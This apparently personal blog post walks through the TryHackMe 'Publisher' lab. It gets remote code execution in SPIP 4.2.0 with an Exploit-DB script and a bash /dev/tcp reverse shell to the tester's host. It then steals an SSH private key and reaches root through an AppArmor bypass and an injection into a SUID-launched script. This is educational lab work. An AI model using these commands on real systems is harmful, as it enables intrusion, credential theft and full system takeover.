---
title: CTF Walkthrough for TryHackMe Machine Publisher
date: 2024-10-11 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [TryHackMe, Writeup]   
image:
  path: /assets/img/posts/walthrough/tryhackme/2024-10-11-publisher/box-publisher.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Publisher a TryHackMe machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: Publisher<br>
Difficulty: Easy<br>
Operating System: Linux<br>
Machine link: [Publisher](https://tryhackme.com/r/room/publisher)<br>
### Tools used
1) Nmap<br>
2) <br>

## Reconnaissance

We will start by performing a service scan on the target to enumerate services running on open ports.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Publisher/Scans/Service]
└─$ sudo nmap -n 10.10.20.60 -sV -sC -oN service-scan.nmap            
[sudo] password for pentester: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 07:00 BST
Nmap scan report for 10.10.20.60
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.57 seconds
```

The target runs an SSH and an Apache web server. Let's visit the web application running on the target.
![](/assets/img/posts/walthrough/tryhackme/2024-10-11-publisher/1-browse.png)

The web application home page has many appearance of the word SPIP associated with a version number. A Google search on this ame reveals that SPIP is indeed a content management system.
![](/assets/img/posts/walthrough/tryhackme/2024-10-11-publisher/what-is-spip.png)

The home page does contain precise information on the version of SPIP used by our target do let's fuzz this web application to uncover hidden directories.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/Publisher/Scans/Service]
└─$ ffuf -ic -c -u http://10.10.20.60/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .php
                    
<SNIP>
                        [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 122ms]
images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 4213ms]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 4216ms]
spip                    [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 89ms]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 92ms]
                        [Status: 200, Size: 8686, Words: 1334, Lines: 151, Duration: 92ms]
:: Progress: [175302/175302] :: Job [1/1] :: 415 req/sec :: Duration: [0:06:50] :: Errors: 0 ::
```

The directory `spip` is discovered. Upon visiting this direcory, we see the version of SPIP used by our target in the HTML source code.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Publisher/Misc File]
└─$ curl -s http://10.10.20.60/spip/ | grep -i generator 
<meta name="generator" content="SPIP 4.2.0" /></head>
        <small class="generator"><a href="https://www.spip.net/" rel="generator" title="Site réalisé avec SPIP" class="generator spip_out"><svg class='SPIP' viewBox="0 -1 200 154" xmlns="http://www.w3.org/2000/svg" width="60" height="40" focusable='false' aria-hidden='true'>
```

Now that we have the version number, we can Google this to search for any public vulnerability this version may suffer from.
![](/assets/img/posts/walthrough/tryhackme/2024-10-11-publisher/vuln-identification.png)

## Exploitation

The version used by our target apppears to suffer from an unauthenticated remote code execution. We can copy the exploit on [Exploit DB](https://www.exploit-db.com/exploits/51536) and start a listener on our attack host.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Publisher]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

After starting our listener, we can execute a reverse shell on the target in two phases. The first phase consist to create to create a file containing the reverse shell and the phase consist of executing that shell using bash.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Publisher/Misc File]
└─$ python3 spip_exploit.py -v -u http://10.10.20.60/spip -c 'echo "bash -i >& /dev/tcp/10.8.23.19/1234 0>&1" >/tmp/shell'
[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
[+] Execute this payload : s:79:"<?php system('echo "bash -i >& /dev/tcp/10.8.23.19/1234 0>&1" >/tmp/shell'); ?>";

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Publisher/Misc File]
└─$ python3 spip_exploit.py -v -u http://10.10.20.60/spip -c 'bash /tmp/shell'
[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
```

If we return to our listener we will noticesd a reverse connection from the target.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/Publisher]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.23.19] from (UNKNOWN) [10.10.20.60] 38824
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@41c976e507f8:/home/think/spip/spip$ whoami
whoami
```

We have obtained a shell as the www-data user on the target. The SPIP's root directory on the target is a sub directory of the think user and we are free to navigate in that directory. We can use this access to read the flag stored in think's home direcotory.
```bash
www-data@41c976e507f8:/home/think$ ls 
ls 
spip
user.txt
```

Since we can navigate this user's directory, let's read the SSH private key stored in the `.ssh` directory.
```bash
www-data@41c976e507f8:/home/think$ cat .ssh/id_rsa
cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxPvc9pijpUJA4olyvkW0ryYASBpdmBasOEls6ORw7FMgjPW86tDK
uIXyZneBIUarJiZh8VzFqmKRYcioDwlJzq+9/2ipQHTVzNjxxg18wWvF0WnK2lI5TQ7QXc
<SNIP>
M8X1rGlGEnXqGuw917aaHPPBnSfquimQkXZ55yyI9uhtc6BrRanGRlEYPOCR18Ppcr5d96
Hx4+A+YKJ0iNuyTwAAAA90aGlua0BwdWJsaXNoZXIBAg==
-----END OPENSSH PRIVATE KEY-----
```

We can use this private key to connect to the system as the user.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Publisher/Misc File]
└─$ nano id_rsa  

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Publisher/Misc File]
└─$ chmod 600 id_rsa

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/Publisher/Misc File]
└─$ ssh think@10.10.20.60 -i id_rsa 
The authenticity of host '10.10.20.60 (10.10.20.60)' can't be established.
ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.
<SNIP>

Last login: Mon Feb 12 20:24:07 2024 from 192.168.1.13
think@publisher:~$ 
```

## Post Exploitation

Now that we have access to the target as the think user, let's use this to escalate privileges to that of the root user. We can start this by enumerating binaries with SUID bit set.
```bash
think@publisher:~$ find / -perm -4000 2>/dev/null
/usr/lib/policykit-1/polkit-agent-helper-1
<SNIP>
/usr/sbin/run_container
/usr/bin/at
<SNIP>
/usr/bin/umount
think@publisher:~$
```

We can notice an uncommon binary called `run_container`. Let's examine this custom binary to see what it does. A simple method is to read all printable strings in the binary.
```bash
think@publisher:~$ strings run_container
<SNIP>
[]A\A]A^A_
/bin/bash                                           
/opt/run_container.sh                               
:*3$"                                               
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0  
<SNIP>
.bss
.comment   
```

We see that the binary runs  a bash script in the `/opt` directory. We can enumerate this script by viewing its content and its permissions.
```bash
think@publisher:~$ cat /opt/run_container.sh
#!/bin/bash

# Function to list Docker containers
list_containers() {
    if [ -z "$(docker ps -aq)" ]; then
        docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
    fi
    echo "List of Docker containers:"
    docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
    echo ""
}

# Function to prompt user for container ID
prompt_container_id() {
    read -p "Enter the ID of the container or leave blank to create a new one: " container_id
    validate_container_id "$container_id"
}

# Function to display options and perform actions
select_action() {
    echo ""
    echo "OPTIONS:"
    local container_id="$1"
    PS3="Choose an action for a container: "
    options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")

    select opt in "${options[@]}"; do
        case $REPLY in
            1) docker start "$container_id"; break ;;
            2)  if [ $(docker ps -q | wc -l) -lt 2 ]; then
                    echo "No enough containers are currently running."
                    exit 1
                fi
                docker stop "$container_id"
                break ;;
            3) docker restart "$container_id"; break ;;
            4) echo "Creating a new container..."
               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest 
               break ;;
            5) echo "Exiting..."; exit ;;
            *) echo "Invalid option. Please choose a valid option." ;;
        esac
    done
}

# Main script execution
list_containers
prompt_container_id  # Get the container ID from prompt_container_id function
select_action "$container_id"  # Pass the container ID to select_action function

think@publisher:~$ ls -l /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
think@publisher:~$ echo test >> /opt/run_container.sh
-ash: /opt/run_container.sh: Permission denied
```

This script appears to manage docker containers. We can see that we have written permission on the script but for some reasons any attempt to write into the script is denied. This may be due to our current shell session so let's enumerate our current shell.
```bash
think@publisher:~$ grep think /etc/passwd
think:x:1000:1000:,,,:/home/think:/usr/sbin/ash
```

We can see that our shell is not the ordinary bash shell we used to know but instead an ash shell. This might be a restricted shell. A quick enumeration of the file system will let us know that Apparmor is actively used on the target and we can see a profile for the ash shell we saw earlier.
```bash
think@publisher:~$ cat /etc/apparmor.d/usr.sbin.ash 
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
think@publisher:~$ 
```

This profile restricts us from performing several system tasks for example it restricts us from editing any file in the `/opt` directory with the line `deny /opt/** w,` even if we have the permission to do it. Also the line `  /usr/bin/** mrix,` and  `/usr/sbin/** mrix,` causes any executable launch from this directory to inherit the same restriction. To bypass this, we will have to launch a shell from a directory which does not inherit these restrictions. We can do this by copying a shell binary to a directory we have access to in this case `/dev/shm` and launch the shell from there.
```bash
think@publisher:~$ cp /usr/bin/bash /dev/shm
think@publisher:~$ ls /dev/shm
bash
think@publisher:~$ /dev/shm/bash
think@publisher:~$
```

After we launch the shell from the new directory, we can now leverage the permission we have over the `run_container` script to obtain a shell as the root user. We can do this by adding the line `bash -p` at the top of the script.
```bash
think@publisher:~$ head /opt/run_container.sh 
#!/bin/bash
bash -p
# Function to list Docker containers
<SNIP>

think@publisher:~$ /usr/sbin/run_container 
bash-5.0# whoami
root
bash-5.0# ls /root
root.txt  spip
```
We have successfully obtained a root shell on the target. We can use this access to read the second flag as shown above.

## Conclusion

Congratulations! In this walkthrough, you have exploited the a remote code execution vulnerability in an outdated version of the SPIP CMS to obtain a foothold on the target. Further,more, you leverage some misconfiguration of Apparmor on the system to escalate privileges using a binary with SUID bit set. This machine was designed to show improper patching habits and misconfiguration in operating system services could seriously impact an organisation's security posture. Thanks for following up on this walkthrough.
